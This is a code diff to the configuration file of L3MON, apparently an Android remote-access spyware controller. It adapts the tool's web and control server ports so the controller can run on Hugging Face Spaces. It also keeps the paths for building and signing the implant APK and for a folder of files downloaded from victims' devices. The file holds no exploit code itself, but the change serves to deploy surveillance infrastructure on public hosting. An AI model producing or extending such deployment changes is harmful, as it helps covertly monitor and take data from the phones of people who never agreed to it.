@@ -1,16 +1,22 @@
 const path = require('path');
 
+// Enable debug mode if needed
 exports.debug = false;
 
-exports.web_port = 22533;
-exports.control_port = 22222;
+// Hugging Face Spaces assigns a random port via process.env.PORT
+// We will use that port for both web and control server
+const HF_PORT = process.env.PORT || 7860;
+
+// Ports
+exports.web_port = HF_PORT;
+exports.control_port = HF_PORT; // Using the same port on HF (only 1 exposed port)
 
 // Paths
-exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
-exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')
+exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');
+exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk');
 
-exports.downloadsFolder = '/client_downloads'
-exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
+exports.downloadsFolder = '/client_downloads';
+exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder);
 
 exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
 exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
@@ -34,7 +40,7 @@ exports.messageKeys = {
     installed: '0xIN',
     permissions: '0xPM',
     gotPermission: '0xGP'
-}
+};
 
 exports.logTypes = {
     error: {
@@ -53,4 +59,4 @@ exports.logTypes = {
         name: 'INFO',
         color: 'blue'
     }
-}
+};
